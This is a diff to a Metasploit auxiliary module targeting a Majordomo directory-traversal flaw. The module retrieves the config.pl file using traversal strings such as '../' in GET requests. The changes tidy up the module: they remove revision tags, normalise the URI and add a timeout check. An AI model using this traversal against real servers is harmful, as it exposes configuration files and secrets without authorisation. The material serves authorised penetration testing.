@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -26,7 +22,6 @@ class Metasploit3 < Msf::Auxiliary
 				module will attempt to download the Majordomo config.pl file.
 			},
 			'Author'         =>	['Nikolas Sotiriu'],
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					['OSVDB', '70762'],
@@ -48,16 +43,12 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 	end
 
-	def target_url
-		"http://#{vhost}:#{rport}#{datastore['URI']}"
-	end
-
 	def run_host(ip)
 		trav_strings = [
 			'../',
 			'./.../'
 		]
-		uri  = datastore['URI']
+		uri  = normalize_uri(datastore['URI'])
 		file = datastore['FILE']
 		deep = datastore['DEPTH']
 		file = file.gsub(/^\//, "")
@@ -74,6 +65,11 @@ class Metasploit3 < Msf::Auxiliary
 						'method'  => 'GET',
 						'uri'     => uri + payload,
 					}, 25)
+
+				if res.nil?
+					print_error("#{rhost}:#{rport} Connection timed out")
+					return
+				end
 
 				print_status("#{rhost}:#{rport} Trying URL " + payload )
 
@@ -97,6 +93,7 @@ class Metasploit3 < Msf::Auxiliary
 						print_error("#{rhost}:#{rport} No HTML was returned")
 					end
 				else
+					# if res is nil, we hit this
 					print_error("#{rhost}:#{rport} Unrecognized #{res.code} response")
 				end
 				i += 1;
